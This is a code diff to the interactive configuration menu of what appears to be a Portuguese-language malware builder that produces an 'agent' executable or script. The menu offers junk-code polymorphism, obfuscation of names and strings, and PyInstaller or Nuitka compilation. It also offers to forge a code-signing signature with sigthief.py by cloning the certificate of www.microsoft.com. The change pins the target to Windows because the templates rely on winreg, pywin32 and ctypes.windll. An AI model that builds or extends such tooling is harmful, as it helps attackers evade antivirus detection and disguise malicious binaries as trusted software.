@@ -148,7 +148,11 @@ def main_interactive():
     else:
         answers['cdn_token'] = ''
 
-    answers['platform'] = questionary.select("Plataforma Alvo:", choices=['windows', 'linux']).ask()
+    # O template atual usa APIs exclusivas do Windows (winreg, pywin32 e ctypes.windll).
+    # Manter o alvo fixo evita gerar um arquivo ".elf" que, na prática, continua sendo
+    # um binário Windows quando o Builder é executado no Windows.
+    answers['platform'] = 'windows'
+    console.print("[info]Plataforma alvo: Windows (templates atuais são Windows-only).[/info]")
     answers['type'] = questionary.select("Tipo de Saída:", choices=['executável', 'script (.py)']).ask()
     answers['polymorphic'] = questionary.confirm("Aplicar polimorfismo avançado (código lixo)?").ask()
     answers['obfuscate'] = questionary.confirm("Aplicar ofuscação (nomes e strings)?").ask()
@@ -156,16 +160,14 @@ def main_interactive():
     
     if answers['type'] == 'executável':
         answers['compiler'] = questionary.select("Compilador:", choices=['pyinstaller', 'nuitka']).ask()
-        ext = 'exe' if answers['platform'] == 'windows' else 'elf'
-        default_name = f"agent.{ext}"
+        default_name = "agent.exe"
         answers['output'] = questionary.text("Nome do arquivo de saída:", default=default_name).ask()
         extra_args_str = questionary.text("Argumentos extras para o compilador (ex: --windows-icon-from-ico=icon.ico):").ask()
         answers['extra_args'] = extra_args_str.split() if extra_args_str else []
 
-        if answers['platform'] == 'windows':
-            answers['sign_executable'] = questionary.confirm("Deseja forjar assinatura de código (requer sigthief.py)?").ask()
-            if answers['sign_executable']:
-                answers['sign_host'] = questionary.text("Host para clonar certificado:", default="www.microsoft.com").ask()
+        answers['sign_executable'] = questionary.confirm("Deseja forjar assinatura de código (requer sigthief.py)?").ask()
+        if answers['sign_executable']:
+            answers['sign_host'] = questionary.text("Host para clonar certificado:", default="www.microsoft.com").ask()
 
     else: # Se o tipo for 'script (.py)'
         default_name = "agent.py"
